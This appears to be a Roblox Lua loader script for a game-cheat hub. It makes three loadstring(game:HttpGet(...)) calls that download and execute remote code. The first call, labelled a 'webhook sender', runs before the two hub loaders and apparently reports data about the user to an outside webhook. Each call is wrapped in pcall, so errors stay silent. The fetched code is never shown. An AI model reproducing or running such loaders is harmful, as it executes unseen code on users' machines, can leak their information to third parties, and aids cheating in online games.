-- Step 1: Run webhook sender immediately
pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/yuunii-1/Files/refs/heads/main/SendDchook.lua"))()
end)

-- Step 2: Wait 7 seconds
task.delay(7, function()
    -- Step 3: Run both scripts at the same time
    task.spawn(function()
        pcall(function()
            loadstring(game:HttpGet("https://lunor.dev/loader"))()
        end)
    end)

    task.spawn(function()
        pcall(function()
            loadstring(game:HttpGet("https://raw.githubusercontent.com/Lunorhubb/LunorScript/refs/heads/main/Loader.lua"))()
        end)
    end)
end)
